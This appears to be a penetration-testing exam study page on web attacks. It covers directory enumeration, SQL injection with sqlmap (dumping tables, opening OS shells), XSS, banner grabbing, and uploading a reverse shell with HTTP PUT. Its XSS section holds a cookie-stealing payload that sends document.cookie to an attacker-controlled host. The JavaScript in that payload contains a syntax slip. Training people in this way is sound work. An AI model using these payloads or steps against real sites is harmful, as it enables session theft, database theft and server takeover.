---
description: no.... this is not a "how to hack your friends social media accounts" 101
---

# Web Attacks

## **Intro**

You're almost certainly guaranteed to come across some form of web based application that can be attacked in this exam. Web applications are also one of the biggest attack surfaces in the real world as well, so beginning to understand the concept of working with web technologies will serve you well. I highly recommend taking your time to work through this section of the course and become comfortable with the material and then revisiting it again once you're familiar with the terminology being used. 

![](../../.gitbook/assets/giphy-2-.gif)



## **Hidden directory & file enumeration**

while the course introduces dirb and dirbuster- I would recommend gobuster or dirsearch. dirbuster is fine if you like a GUI but dirsearch will give you basically the same results and, in my opinion, is easier to use. Check it out here: [https://github.com/maurosoria/dirsearch](https://github.com/maurosoria/dirsearch)

### **Dirsearch**

```bash
python3 dirsearch.py -u <URL> -e <EXTENSIONS>
```

* quickly find the paths to hidden files, directories, etc on a domain
* I recommend looing for php, old, or conf extensions initially

### **gobuster**

```bash
gobuster dir <url> -w <wordlist>
```

* gobuster is another fan favorite that is notorious for being quick

## **SQL Injection \(SQLi\)**

sqli is another biggie here. I recommend really reading the ouput sqlmap and understanding what it is doing because testing sqli's by hand will always be necessary to validate what the tool discovers. sqlmap is a tool that is invaluable in your toolbelt solely based off the information it can provide to you if you know how to use it right. Half of the battle is identifying sql injection points so here is my thought process. 

1. Find points on the page that may need to query information stored somewhere else, like blog posts, articles, images, etc
2. click on the resource in question and then look for a parameter in the url or for a php page
   1. something alongs the lines of:
      1.  http://example.com/find.php?id=1234
3. once identified, use booleans after the operator to check the pages behavior
   1. http://example.com/find.php?id=1234' OR 1=2; -- -
4. If the output breaks then test a true condition:
   1. http://example.com/find.php?id=1234' OR 1=1; -- -
5. If the output comes back we have a sqli and can proceed to use tools to get further info

### **sqlmap**

```bash
sqlmap --wizard
```

* can be used to help if you're struggling with the CLI, but I highly advise against getting comfortable with this. It doesn't provide the same level of customizability and it's widly inconveneient. 

```bash
sqlmap -u <url w/ parameter> 
```

* should validate the sqli and if vulnerable give us some system details as well

```bash
sqlmap -u <url w/ parameter> --tables
```

* this dumps the table

```bash
sqlmap -u <url w/ parameter> --current-db <database name> --dump
```

* dumps all of the contents of the tables in that database

```bash
sqlmap -u <url w/ parameter> [--os-shell] or [--os-pwn] 
```

* os-shell and os-pwn allow the user to try to open a backend shell or a meterpreter shell respectively

## Cross-Site Scripting \(XSS\)

While this course doesn't present any tools for XSS, there are a few things to keep in mind:

* Persistent XSS: where the payloadd is embeded and stored on the page in some way shape or form. Think about someone posting a malicious payload into a tweet and then anytime anyone opens the tweet they are subject to malicious payload.
* Reflected XSS: the payload is carried in the input to the site. Think about encoding a malicious javascript snippet into a URL and then getting someone to click on the malicious link. 

Looking for XSS is a similar methodology to looking for SQLi, here are a few things that I look for:

1. identify input areas on a site, any spots where input could be potentially not sanitized
2. test input with html tags: &lt;h1&gt; Test &lt;/h1&gt;
3. test with javascript: 

```javascript
<script> alert('XSS'); </script> 
```

4. If this works then you can use the following js to steal cookies:

```javascript
<script> 
var i = new Image();
i.src = "http://your.own.IP.address/get.php?cookies=" += document.cookie;
</script>
```

* note, you would need to be hosting the corresponding get.php file on your own web server for that to work



## **Banner Grabbing & HTTP Verbs**

banner grabbing is the act of requesting the header information from a web application via an HTTP request to further enumerate what actions you can perform on the server. 

### **netcat**

```javascript
nc -vv x.x.x.x 80
HEAD / HTTP/1.1
```

```javascript
nc -vv x.x.x.x 80
OPTIONS / HTTP/1.1
```

* make sure to hit \[return/enter\] twice after the HTTP verb line

### **openssl**

this is used for the same purpose as netcat but for https commuincations that netcat does not support

```javascript
openssl s_client -connect x.x.x.x
HEAD / HTTP/1.1
```

```javascript
openssl s_client -connect x.x.x.x
OPTIONS / HTTP/1.1
```

### **abusing HTTP verbs \(netcat\)**

if the wrong http verbs are enabled for anyone by default, you can get away with a lot of things on a server- like uploading a reverse shell to the website. A trick for doing this is: 

* find reverse shell script from internet and adjust the IP and port

```javascript
wc rev-shell.php
> [#] rev-shell.php

nc -vv x.x.x.x 80
PUT /rev-shell.php
Content-type: text/html
Content-length: [#]
```

* where \[\#\] is the length that is output from the wc command initially









